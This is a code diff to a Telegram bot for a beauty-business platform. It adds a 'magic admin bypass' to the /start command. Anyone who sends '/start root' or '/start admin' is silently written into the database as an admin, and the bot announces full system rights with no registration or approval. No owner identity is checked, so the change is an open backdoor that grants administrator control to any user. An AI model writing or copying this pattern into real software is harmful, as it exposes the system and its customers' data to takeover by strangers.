@@ -153,6 +153,33 @@ export function setupBotHandlers(bot: Telegraf<BotContext>) {
   // Start command
   bot.start(async (ctx) => {
     const name = ctx.from?.first_name || 'Beauty Expert';
+    const payload = (ctx.message as any).text.split(' ')[1]; // Payload: /start <payload>
+
+    const supabase = getSupabase();
+
+    // 👑 MAGIC ADMIN BYPASS (Zero-Click Registration for Owner)
+    if (payload === 'root' || payload === 'admin') {
+      if (supabase && ctx.from) {
+        // Молчаливая регистрация суперадмина
+        await supabase.from('users').upsert({
+          telegram_id: ctx.from.id,
+          full_name: name,
+          role: 'admin',
+          business_name: 'BeautyOS Core Admin',
+          // Автозаполняем поля, чтобы пропустить Wizard
+          phone: '+00000000',
+          address: 'System'
+        }, { onConflict: 'telegram_id' });
+      }
+      
+      return ctx.reply(`👑 **ברוך שובך, מנהל המערכת (${name})!**\n\nזיהיתי את פקודת המעקף שלך. קיבלת הרשאת Admin מלאה לכל המערכת, ללא צורך בהרשמה או אישור.\nכל התכונות, הפונקציות וההגדרות פתוחות בפניך.`, 
+        Markup.inlineKeyboard([
+          [Markup.button.webApp('🚀 פתח את ה-Studio (פאנל ניהול)', process.env.WEBAPP_URL || '')]
+        ])
+      );
+    }
+
+    // 🛍 REGULAR USER FLOW
     await ctx.reply(`✨ **ברוכים הבאים ל-BeautyOS AI v2!** ✨\n\nהיי ${name}, המערכת המתקדמת ביותר לניהול העסק והפקת תוכן מבוסס בינה מלאכותית כאן לשירותך.`, 
       Markup.inlineKeyboard([
         [Markup.button.webApp('🚀 פתח את ה-Studio', process.env.WEBAPP_URL || '')],
